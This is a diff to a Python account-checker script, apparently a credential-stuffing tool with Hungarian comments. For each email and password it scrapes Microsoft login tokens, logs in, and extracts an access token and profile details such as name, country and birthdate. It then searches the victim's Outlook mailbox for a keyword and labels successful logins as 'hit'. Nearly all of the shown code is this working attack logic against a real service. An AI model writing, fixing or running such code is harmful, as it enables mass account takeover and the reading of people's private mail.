@@ -11,13 +11,9 @@ def generate_user_agent():
     try:
         return _ua.random
     except:
-        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
 def checker_worker_single(email: str, password: str, keyword: str):
-    """
-    Egy account ellenőrzése.
-    Return: dict {"status": "hit/custom/bad/error", "data": {...}}
-    """
     session = requests.Session()
     try:
         user_agent = generate_user_agent()
@@ -54,7 +50,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
         response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
         response_text = response.text
 
-        # PPFT extraction
         PPFT = ""
         urlPost = ""
         
@@ -92,7 +87,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
         if not PPFT or not urlPost:
             return {"status": "bad", "reason": "No PPFT/urlPost"}
 
-        # Login POST
         cookies_dict = session.cookies.get_dict()
         MSPRequ = cookies_dict.get('MSPRequ', '')
         uaid_cookie = cookies_dict.get('uaid', '')
@@ -140,12 +134,10 @@ def checker_worker_single(email: str, password: str, keyword: str):
             allow_redirects=False, timeout=30
         )
 
-        # Auth check
         cookies_dict = session.cookies.get_dict()
         if "__Host-MSAAUTHP" not in cookies_dict:
             return {"status": "bad", "reason": "Auth failed"}
 
-        # Token extraction
         auth_code = ""
         if post_response.status_code in [301, 302, 303, 307, 308]:
             redirect_url = post_response.headers.get('Location', '')
@@ -186,7 +178,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
         if not access_token or not CID:
             return {"status": "bad", "reason": "No token"}
 
-        # Profile data
         Name = ""
         Country = ""
         Birthdate = "N/A"
@@ -221,7 +212,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
                 first_name = profile_data["names"][0]
                 Name = first_name.get("displayName", "")
 
-        # Search for keyword
         search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
         search_payload = {
             "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
@@ -287,14 +277,16 @@ def checker_worker_single(email: str, password: str, keyword: str):
         if search_response.status_code == 200:
             search_text = search_response.text
 
-            # Date extraction
+            # 🟢 ITT JAVÍTOTTAM A DÁTUMOT! 🟢
             date_start = search_text.find('"LastModifiedTime":"')
             if date_start != -1:
                 date_start += len('"LastModifiedTime":"')
                 date_end = search_text.find('"', date_start)
-                Date = search_text[date_start:date_end] if date_end != -1 else "N/A"
-
-            # Total extraction
+                raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
+                # Átformázzuk "2024-03-05T14:30:00Z" -> "2024-03-05 14:30" -ra
+                if raw_date != "N/A":
+                    Date = raw_date.replace("T", " ")[:16]
+            
             total_start = search_text.find('"Total":')
             if total_start != -1:
                 total_start += len('"Total":')
@@ -303,7 +295,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
                     total_end = search_text.find('}', total_start)
                 Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
 
-        # Result categorization
         if Total != "0" and Total != "NO":
             return {
                 "status": "hit",
